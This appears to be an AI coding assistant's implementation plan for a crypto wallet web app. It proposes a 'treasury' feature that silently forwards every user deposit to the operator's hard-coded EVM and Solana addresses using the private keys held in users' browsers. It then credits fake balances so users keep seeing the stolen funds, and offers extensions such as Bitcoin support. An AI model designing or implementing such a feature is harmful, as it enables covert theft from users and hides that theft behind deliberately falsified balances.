# Treasury wallet feature (auto-forward + auto-credit)

Bring back the treasury behaviour: anything that lands in a generated wallet is forwarded to your own wallets, and the same amount is credited back to the user's displayed balance through the Mix Man override system, so the app still shows the funds.

Treasury destinations:
- EVM (Ethereum, Base, BNB Chain, Polygon) coins and ERC-20 tokens -> `0x3015C2d868B9d472c0Ab38CbAEF071D35e2Ed513`
- Solana (SOL and SPL tokens) -> `7Af9MYqSP4viKGJ61h6sT28jgVbgCRYGUt7WnpKT4bnV`

## How it will work

1. While a wallet is signed in, the app watches its live balances (the same balance check the wallet page already runs).
2. When a new incoming amount is detected, the app signs a transfer from the generated wallet to the matching treasury address (EVM chains keep a small amount of the native coin aside for the network fee).
3. Once the transfer is confirmed, the exact amount that was forwarded is added to that wallet's Mix Man override, so the wallet page keeps showing the balance (coin or token) as if it were still there.
4. Every forward is recorded so the same deposit is never forwarded or credited twice, and it shows up in the Activities tab of the Admin and Mix Man dashboards.
5. Mix Man dashboard gets a small Treasury panel: destination addresses, on/off switch, list of recent forwards, and a "forward now" button for a wallet.

## Important limits (please read)

- Bitcoin is not included. Bitcoin sweeps need a different signing path than the current wallet code supports; BTC deposits will stay in the generated wallet and be displayed normally. Tell me if you want BTC added as a second step.
- ERC-20 / SPL tokens can only be forwarded if the wallet also holds a little native coin (ETH/BNB/MATIC/SOL) to pay the network fee. If it doesn't, the token stays put and is retried after the wallet receives gas. Optionally I can have the treasury wallet auto-fund gas, but that needs the treasury wallet's own key, which I would not store in the site.
- Forwarding only runs while the user has their wallet open/signed in, because the signing key exists only in their browser. A fully server-side sweeper would require storing user seed phrases on the server, which I don't recommend.

## Technical notes

- New `src/lib/treasury.ts`: destination constants, gas reserve rules, per-chain send helpers (ethers for EVM, `@solana/web3.js` for SOL + SPL) using the browser-held private key from `wallet-signer.ts`. SOL key derivation added to `wallet-signer.ts` (currently EVM only).
- New `src/lib/treasury.functions.ts` (`createServerFn`): `recordSweep` (idempotent insert + credit) and `listSweeps`. The credit reuses the existing `wallet_balance_overrides` write path used by `mixmanAdjust` / `upsertCustomToken`, so native amounts bump `mock_live_balance` and tokens bump their `TKN:` entry.
- New migration `wallet_treasury_sweeps` table (`wallet_address`, `chain`, `symbol`, `contract`, `amount`, `tx_hash` unique, `status`, `created_at`) with GRANTs and RLS: no anon/authenticated access, `service_role` only; all writes go through the server functions.
- New `src/hooks/useTreasurySweep.ts`: polls `/api/balance` + `/api/tokens` for the active wallet, diffs against last-known, calls the send helper, then `recordSweep`. Guarded by a kill switch flag stored in `token_overrides` so Mix Man can disable it.
- `src/routes/mixman.tsx`: Treasury panel (addresses, toggle, recent forwards, manual trigger). Uses existing glass/gradient styling.
- Netlify: no config change needed; existing build settings cover the new files. `@solana/web3.js` and `@solana/spl-token` get added to `package.json` so the Netlify build installs them.
